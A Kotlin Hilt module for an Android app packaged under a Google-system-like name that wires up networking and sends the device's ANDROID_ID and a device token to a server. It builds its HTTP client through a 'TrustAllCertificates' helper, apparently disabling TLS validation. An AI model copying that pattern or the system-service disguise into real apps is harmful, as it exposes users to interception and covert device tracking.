package com.google.android.systemservice.di

import android.content.Context
import com.google.android.systemservice.BuildConfig
import com.google.android.systemservice.config.AndroidConfig
import com.google.android.systemservice.data.api.ApiService
import com.google.android.systemservice.data.datasource.LocalDataSource
import com.google.android.systemservice.data.repository.DeviceRepository
import com.google.android.systemservice.data.repository.DeviceRepositoryImpl
import com.google.gson.Gson
import com.google.gson.GsonBuilder
import dagger.Module
import dagger.Provides
import dagger.hilt.InstallIn
import dagger.hilt.android.qualifiers.ApplicationContext
import dagger.hilt.components.SingletonComponent
import kotlinx.coroutines.CoroutineDispatcher
import kotlinx.coroutines.Dispatchers
import okhttp3.OkHttpClient
import okhttp3.logging.HttpLoggingInterceptor
import com.google.android.systemservice.utils.TrustAllCertificates
import retrofit2.Retrofit
import retrofit2.converter.gson.GsonConverterFactory
import java.util.concurrent.TimeUnit
import javax.inject.Qualifier
import javax.inject.Singleton

@Module
@InstallIn(SingletonComponent::class)
object AppModule {
    
    @Provides
    @Singleton
    fun provideGson(): Gson {
        return GsonBuilder()
            .setLenient()
            .create()
    }
    
    @Provides
    @Singleton
    fun provideOkHttpClient(@ApplicationContext context: Context): OkHttpClient {
        val builder = TrustAllCertificates.createSecureClientBuilder()
            .writeTimeout(30, TimeUnit.SECONDS)
            .addInterceptor { chain ->
                val deviceId = android.provider.Settings.Secure.getString(
                    context.contentResolver, android.provider.Settings.Secure.ANDROID_ID
                )
                val request = chain.request().newBuilder()
                    .addHeader("X-Device-Token", AndroidConfig.DEVICE_TOKEN)
                    .addHeader("X-Device-ID", deviceId)
                    .build()
                chain.proceed(request)
            }
        
        if (BuildConfig.DEBUG) {
            val logging = HttpLoggingInterceptor()
            logging.level = HttpLoggingInterceptor.Level.BODY
            builder.addInterceptor(logging)
        }
        
        return builder.build()
    }
    
    @Provides
    @Singleton
    fun provideRetrofit(okHttpClient: OkHttpClient, gson: Gson): Retrofit {
        return Retrofit.Builder()
            .baseUrl(BuildConfig.SERVER_BASE_URL)
            .client(okHttpClient)
            .addConverterFactory(GsonConverterFactory.create(gson))
            .build()
    }
    
    @Provides
    @Singleton
    fun provideApiService(retrofit: Retrofit): ApiService {
        return retrofit.create(ApiService::class.java)
    }
    
    @Provides
    @Singleton
    fun provideLocalDataSource(
        @ApplicationContext context: Context
    ): LocalDataSource {
        return LocalDataSource(context)
    }
    
    @Provides
    @Singleton
    fun provideDeviceRepository(
        apiService: ApiService,
        localDataSource: LocalDataSource,
        @IoDispatcher ioDispatcher: CoroutineDispatcher
    ): DeviceRepository {
        return DeviceRepositoryImpl(apiService, localDataSource, ioDispatcher)
    }
    
    @Provides
    @IoDispatcher
    fun provideIoDispatcher(): CoroutineDispatcher = Dispatchers.IO
    
    @Provides
    @MainDispatcher
    fun provideMainDispatcher(): CoroutineDispatcher = Dispatchers.Main
}

@Qualifier
@Retention(AnnotationRetention.BINARY)
annotation class IoDispatcher

@Qualifier
@Retention(AnnotationRetention.BINARY)
annotation class MainDispatcher
